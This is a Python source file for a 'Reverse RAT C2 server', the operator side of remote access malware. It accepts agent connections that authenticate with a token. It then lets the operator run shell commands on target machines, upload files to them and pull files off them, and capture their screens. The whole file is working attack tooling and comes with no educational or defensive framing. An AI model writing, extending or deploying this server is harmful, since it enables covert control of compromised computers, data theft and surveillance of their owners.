```python
import argparse
import base64
import hmac
import queue
import socket
import threading
import time
import uuid

from protocols import recv_msg, send_msg


def safe_compare(a, b):
    try:
        return hmac.compare_digest(a, b)
    except Exception:
        return False


class Session:
    _counter = 0

    def __init__(self, sock, addr):
        Session._counter += 1
        self.id = Session._counter
        self.sock = sock
        self.addr = addr
        self.info = {}
        self.alive = True
        self.queue = queue.Queue()
        self.lock = threading.Lock()

        threading.Thread(target=self._recv_loop, daemon=True).start()

    def _recv_loop(self):
        while self.alive:
            msg = recv_msg(self.sock)
            if msg is None:
                self.alive = False
                break
            self.queue.put(msg)

    def send(self, msg):
        with self.lock:
            send_msg(self.sock, msg)

    def command(self, cmd, timeout=30):
        msg_id = uuid.uuid4().hex
        try:
            self.send({"id": msg_id, **cmd})
        except Exception as e:
            self.alive = False
            return {"ok": False, "data": f"send failed: {e}"}

        deadline = time.time() + timeout
        while time.time() < deadline:
            try:
                resp = self.queue.get(timeout=timeout)
            except queue.Empty:
                break

            if resp.get("id") == msg_id:
                return resp

        return {"ok": False, "data": "timeout"}

    def close(self):
        self.alive = False
        try:
            self.sock.shutdown(socket.SHUT_RDWR)
        except Exception:
            pass
        try:
            self.sock.close()
        except Exception:
            pass


class C2Server:
    def __init__(self, host, port, token, log=None):
        self.host = host
        self.port = port
        self.token = token
        self.sessions = []
        self.listener = None
        self.running = False
        self.log = log or print

    def start(self):
        self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.listener.bind((self.host, self.port))
        self.listener.listen(5)
        self.running = True

        threading.Thread(target=self._accept_loop, daemon=True).start()
        self.log(f"[+] C2 server listening on {self.host}:{self.port}")

    def stop(self):
        self.running = False
        try:
            self.listener.close()
        except Exception:
            pass
        for s in self.sessions:
            s.close()

    def _accept_loop(self):
        while self.running:
            try:
                sock, addr = self.listener.accept()
            except OSError:
                break

            sock.settimeout(5)
            try:
                auth = recv_msg(sock)

                if (
                    auth
                    and auth.get("type") == "auth"
                    and safe_compare(auth.get("token", ""), self.token)
                ):
                    sock.settimeout(None)
                    session = Session(sock, addr)
                    session.info = auth.get("client", {})
                    self.sessions.append(session)
                    self.log(
                        f"[+] Session {session.id} from {addr[0]}:{addr[1]} "
                        f"hostname={session.info.get('hostname')}"
                    )
                else:
                    sock.close()
                    self.log(f"[-] Rejected unauthorised connection {addr}")
            except Exception as e:
                self.log(f"[-] Error from {addr}: {e}")
                try:
                    sock.close()
                except Exception:
                    pass


def session_menu(s):
    print(f"\nSession {s.id}. Type 'help' for commands.")

    while s.alive:
        try:
            line = input(f"session-{s.id}> ").strip()
        except (EOFError, KeyboardInterrupt):
            break

        if not line:
            continue

        if line == "help":
            print(
                """
  exec <command>              Execute a shell command on target
  ping                        Ping the target agent
  upload <local> <remote>     Upload local file to target path
  download <remote> <local>   Download remote file to local path
  screenshot                  Capture and save screenshot
  exit                        Close session
"""
            )

        elif line.startswith("exec "):
            cmd = line[5:].strip()
            resp = s.command({"type": "exec", "cmd": cmd})
            print(resp.get("data", ""))

        elif line == "ping":
            resp = s.command({"type": "ping"})
            print(resp.get("data", ""))

        elif line.startswith("upload "):
            parts = line.split()
            if len(parts) != 3:
                print("Usage: upload <local_file> <remote_path>")
                continue

            _, local, remote = parts
            try:
                with open(local, "rb") as f:
                    data = base64.b64encode(f.read()).decode()
                resp = s.command(
                    {"type": "upload", "remote_path": remote, "base64_data": data}
                )
                print(resp.get("data", ""))
            except Exception as e:
                print(f"Error: {e}")

        elif line.startswith("download "):
            parts = line.split()
            if len(parts) != 3:
                print("Usage: download <remote_path> <local_file>")
                continue

            _, remote, local = parts
            resp = s.command({"type": "download", "remote_path": remote})
            if resp.get("ok"):
                with open(local, "wb") as f:
                    f.write(base64.b64decode(resp["data"]))
                print(f"[+] Downloaded to {local}")
            else:
                print(resp.get("data", ""))

        elif line == "screenshot":
            resp = s.command({"type": "screenshot"})
            if resp.get("ok"):
                path = f"session_{s.id}_screenshot.png"
                with open(path, "wb") as f:
                    f.write(base64.b64decode(resp["data"]))
                print(f"[+] Screenshot saved to {path}")
            else:
                print(resp.get("data", ""))

        elif line in ("exit", "quit"):
            s.command({"type": "exit"})
            s.close()
            break

        else:
            print("Unknown. Type 'help'.")


def cli(server):
    try:
        while True:
            print("\nActive sessions:")
            if not server.sessions:
                print("  (none)")
            for s in server.sessions:
                if s.alive:
                    print(
                        f"  {s.id}. {s.info.get('hostname')} "
                        f"({s.addr[0]}:{s.addr[1]})"
                    )

            choice = input("\nSelect session id (or 'q' to quit): ").strip()
            if choice.lower() == "q":
                break

            if not choice.isdigit():
                continue

            session = next(
                (s for s in server.sessions if s.id == int(choice) and s.alive),
                None,
            )
            if not session:
                print("[-] Session not found")
                continue

            session_menu(session)
    except KeyboardInterrupt:
        pass


def main():
    parser = argparse.ArgumentParser(description="Reverse RAT C2 server")
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=4444)
    parser.add_argument("--token", default="change-me")
    args = parser.parse_args()

    server = C2Server(args.host, args.port, args.token)
    server.start()

    try:
        cli(server)
    finally:
        server.stop()


if __name__ == "__main__":
    main()
```
